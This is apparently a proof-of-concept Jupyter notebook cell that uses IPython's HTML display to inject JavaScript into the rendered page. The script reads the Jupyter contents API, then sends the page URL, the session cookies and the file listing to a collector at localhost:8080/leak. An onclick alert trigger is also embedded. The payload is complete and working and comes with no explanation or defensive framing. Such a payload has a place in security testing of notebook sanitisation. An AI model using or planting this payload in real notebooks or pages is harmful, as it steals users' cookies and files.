```python
from IPython.display import HTML
HTML("""
<h1>Injected content</h1>
<p>This markdown renders inline HTML and JavaScript.</p>
<script>
(async () => {
  try {
    const contentsResp = await fetch('/api/contents?content=1');
    const data = await contentsResp.json();
    const target = 'http://localhost:8080/leak';
    await fetch(target, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        location: window.location.href,
        cookies: document.cookie,
        contents: data
      })
    });
    console.log('exfil sent to', target);
  } catch (err) {
    console.error('exfil failed', err);
  }
})();
</script>
<div style=\"padding:8px;border:1px solid #f00;\" onclick=\"alert('onclick trigger fired')\">Click me</div>
""")
```
